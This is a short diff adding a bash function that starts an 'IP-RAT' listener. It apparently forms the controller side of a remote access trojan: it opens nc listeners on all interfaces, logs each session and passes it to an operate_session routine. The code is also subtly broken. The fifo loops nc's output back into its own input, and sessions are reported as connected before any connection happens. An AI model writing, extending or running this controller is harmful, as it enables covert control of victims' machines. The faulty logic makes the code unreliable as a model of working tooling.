@@ -1,0 +1,16 @@
+start_listener() {
+    local port="${1:-$LISTEN_PORT}"
+    trap 'echo; echo "[*] Stopping all sessions."; pkill -P $$ 2>/dev/null; exit 0' INT
+    echo "[*] IP-RAT listener on 0.0.0.0:$port"
+    local sid=0
+    while true; do
+        # fork per connection using a fifo-backed nc
+        mkfifo "$SESSIONS_DIR/pipe.$sid" 2>/dev/null
+        ( nc -l "$port" < "$SESSIONS_DIR/pipe.$sid" | tee "$LOG_DIR/session_$sid.log" > "$SESSIONS_DIR/pipe.$sid" ) &
+        local pid=$!
+        echo "[+] Session $sid connected (pid $pid). Logs: $LOG_DIR/session_$sid.log"
+        operate_session "$LOG_DIR/session_$sid.log" &
+        sid=$((sid+1))
+        sleep 1
+    done
+}
